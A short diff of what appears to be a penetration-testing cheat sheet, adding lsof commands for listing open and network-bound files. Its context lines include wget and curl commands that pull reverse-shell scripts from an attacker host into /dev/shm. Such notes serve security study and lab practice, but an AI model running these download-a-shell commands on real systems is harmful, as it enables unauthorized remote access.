@@ -32,7 +32,13 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 
 #Files used by network processes
-lsof -i #Files uses by networks processes
+lsof #Open files belonging to any process
+lsof -p 3 #Open files used by the process
+lsof -i #Files used by networks processes
+lsof -i 4 #Files used by network IPv4 processes
+lsof -i 6 #Files used by network IPv6 processes
+lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
 
